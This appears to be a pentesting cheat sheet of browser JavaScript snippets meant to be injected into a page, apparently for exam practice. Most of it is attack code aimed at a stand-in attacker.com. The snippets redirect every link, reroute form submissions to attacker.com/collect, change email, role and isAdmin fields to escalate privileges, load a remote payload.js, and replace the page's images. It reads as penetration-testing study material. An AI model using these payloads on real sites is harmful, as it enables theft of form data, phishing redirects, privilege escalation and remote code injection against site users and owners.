## JavaScript for Pentesters — Modifying HTML with JavaScript

## Objective
Use JavaScript in the browser to:
- Alter page behavior
- Redirect user actions
- Inject external code
- Modify visible content

Think: *“What can I change live in the DOM?”*

---

## 1. Change All Links

### Goal
Rewrite every link on the page

---

### Example

```javascript
document.querySelectorAll('a').forEach(link => {
  link.href = 'https://attacker.com';
});
```

---

### Variant: only external links

```javascript
document.querySelectorAll('a').forEach(link => {
  if (link.hostname !== location.hostname) {
    link.href = 'https://attacker.com';
  }
});
```

---

## 2. Hijack Form Submit

### Goal
Intercept form submission and change destination

---

### Example

```javascript
document.querySelectorAll('form').forEach(form => {
  form.addEventListener('submit', function(e) {
    e.preventDefault();
    this.action = 'https://attacker.com/collect';
    this.submit();
  });
});
```

---

### Variant: log submitted data first

```javascript
document.querySelectorAll('form').forEach(form => {
  form.addEventListener('submit', function(e) {
    e.preventDefault();
    const data = new FormData(this);
    console.log([...data.entries()]);
    this.submit();
  });
});
```

---

## 3. Modify Form Fields

### Goal
Change values or hidden inputs before submit

---

### Example: change visible field

```javascript
document.querySelector('input[name="email"]').value = 'attacker@test.com';
```

---

### Example: change hidden role field

```javascript
document.querySelector('input[name="role"]').value = 'admin';
```

---

### Example: append new hidden field

```javascript
const input = document.createElement('input');
input.type = 'hidden';
input.name = 'isAdmin';
input.value = 'true';
document.querySelector('form').appendChild(input);
```

---

## 4. Include External JS

### Goal
Load remote JavaScript into current page

---

### Example

```javascript
const s = document.createElement('script');
s.src = 'https://attacker.com/payload.js';
document.body.appendChild(s);
```

---

### Variant: load from console quickly

```javascript
var s=document.createElement('script');s.src='https://attacker.com/payload.js';document.head.appendChild(s);
```

---

## 5. Replace Banner Image

### Goal
Swap displayed image with another one

---

### Example: replace first banner-like image

```javascript
document.querySelector('img').src = 'https://attacker.com/banner.jpg';
```

---

### Example: replace by selector

```javascript
document.querySelector('.banner img').src = 'https://attacker.com/banner.jpg';
```

---

### Example: replace all images

```javascript
document.querySelectorAll('img').forEach(img => {
  img.src = 'https://attacker.com/banner.jpg';
});
```

---

## 6. Quick Testing Notes

- Use browser console for live DOM changes
- Changes are usually temporary until refresh
- Best targets:
  - links
  - forms
  - hidden inputs
  - script tags
  - images

---

## 7. Fast Workflow (Exam Mode)

1. Inspect DOM
2. Find target element:
   - `a`
   - `form`
   - `input`
   - `img`
3. Modify with:
   - `querySelector`
   - `querySelectorAll`
4. Test effect live
5. Refresh if needed and retry

---

## 8. Mental Model

JavaScript gives runtime control over the page.

If you can execute JS, you can:
- rewrite navigation
- alter forms
- inject code
- change content

Your job:
→ Find the element → Modify behavior → Control flow